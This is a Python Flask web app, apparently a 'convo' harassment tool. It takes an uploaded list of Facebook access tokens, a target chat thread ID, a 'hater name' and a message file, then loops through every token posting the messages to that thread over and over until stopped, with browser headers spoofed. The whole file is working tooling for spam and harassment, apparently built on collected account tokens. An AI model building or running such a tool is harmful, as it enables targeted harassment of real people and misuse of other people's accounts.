from flask import Flask, request
import requests
from threading import Thread, Event
import time

app = Flask(__name__)
app.debug = True

# Headers to simulate web-based request (like being sent from a browser)
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_event = Event()
threads = []

# Function to send messages
def send_messages(access_tokens, thread_id, hater_name, time_interval, messages):
    while not stop_event.is_set():
        for message in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                full_message = f'{hater_name} {message}'

                # Parameters for the Facebook API request
                parameters = {'access_token': access_token, 'message': full_message}

                # Sending the POST request with headers
                response = requests.post(api_url, data=parameters, headers=headers)

                # Logging success or failure
                if response.status_code == 200:
                    print(f"Message sent using token {access_token}: {full_message}")
                else:
                    print(f"Failed to send message using token {access_token}: {full_message} (Status: {response.status_code})")

                time.sleep(time_interval)

@app.route('/')
def home():
    return '''
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Thread Management</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            background-color: #1e1e1e;
            color: #00ffcc;
            font-family: 'Roboto', sans-serif;
            padding: 20px;
            margin: 0;
        }
        header {
            text-align: center;
            margin-bottom: 30px;
        }
        .container {
            max-width: 600px;
            margin: auto;
        }
        .card {
            background-color: #2b2b2b;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
            border: 2px solid #00ffcc;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }
        input, button {
            padding: 10px;
            margin: 5px 0;
            width: 100%;
            color: #00ffcc;
            background-color: #1e1e1e;
            border: 1px solid #00ffcc;
            border-radius: 5px;
        }
        button {
            cursor: pointer;
            background-color: #00ffcc;
            color: #1e1e1e;
            font-weight: bold;
        }
        footer {
            text-align: center;
            margin-top: 30px;
            font-size: 0.9em;
        }
        .response {
            background-color: #1e1e1e;
            border: 1px solid #00ffcc;
            padding: 10px;
            margin-top: 20px;
            display: none; /* Hidden initially */
        }
    </style>
    <script>
        function showStartMenu() {
            document.getElementById('startCard').style.display = 'block';
            document.getElementById('stopCard').style.display = 'none';
        }

        function showStopMenu() {
            document.getElementById('startCard').style.display = 'none';
            document.getElementById('stopCard').style.display = 'block';
        }

        // AJAX function to submit the form without reloading the page
        function submitForm(event, formId, resultId) {
            event.preventDefault(); // Prevent form from submitting normally

            let formData = new FormData(document.getElementById(formId));
            let xhr = new XMLHttpRequest();

            xhr.open('POST', document.getElementById(formId).action, true);
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    document.getElementById(resultId).style.display = 'block';
                    document.getElementById(resultId).innerHTML = xhr.responseText;
                }
            };
            xhr.send(formData);
        }
    </script>
</head>
<body>
    <header>
        <h1>Arshu Convo WEB</h1>
        <button onclick="showStartMenu()">Start</button>
        <button onclick="showStopMenu()">Stop</button>
    </header>

    <div class="container">
        <div id="startCard" class="card">
            <h2>Start a New Thread</h2>
            <form id="startForm" action="/start_thread" method="post" enctype="multipart/form-data" onsubmit="submitForm(event, 'startForm', 'startResponse')">
                <input type="file" name="tokensFile" required>
                <input type="text" name="thread_id" placeholder="Enter thread ID" required>
                <input type="text" name="hater_name" placeholder="Enter hater name" required>
                <input type="file" name="messages_file" required>
                <input type="number" name="delay" placeholder="Enter delay in seconds" required>
                <button type="submit">Start Thread</button>
            </form>
            <div id="startResponse" class="response"></div>
        </div>

        <div id="stopCard" class="card" style="display: none;">
            <h2>Stop a Running Thread</h2>
            <form id="stopForm" action="/stop_thread" method="post" onsubmit="submitForm(event, 'stopForm', 'stopResponse')">
                <input type="text" name="identifier" placeholder="Enter thread identifier to stop" required>
                <button type="submit">Stop Thread</button>
            </form>
            <div id="stopResponse" class="response"></div>
        </div>
    </div>

    <footer>
        <p>&copy; 2024 Convo Server System | All Rights Reserved</p>
    </footer>
</body>
</html>

    '''

@app.route('/start_thread', methods=['POST'])
def start_thread():
    global threads
    token_file = request.files['tokensFile']
    access_tokens = token_file.read().decode().strip().splitlines()

    thread_id = request.form.get('thread_id')
    hater_name = request.form.get('hater_name')
    time_interval = int(request.form.get('delay'))

    messages_file = request.files['messages_file']
    messages = messages_file.read().decode().splitlines()

    if not any(thread.is_alive() for thread in threads):
        stop_event.clear()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, hater_name, time_interval, messages))
        threads.append(thread)
        thread.start()

    return 'Thread started.'

@app.route('/stop_thread', methods=['POST'])
def stop_thread():
    stop_event.set()
    return 'Thread stopped.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
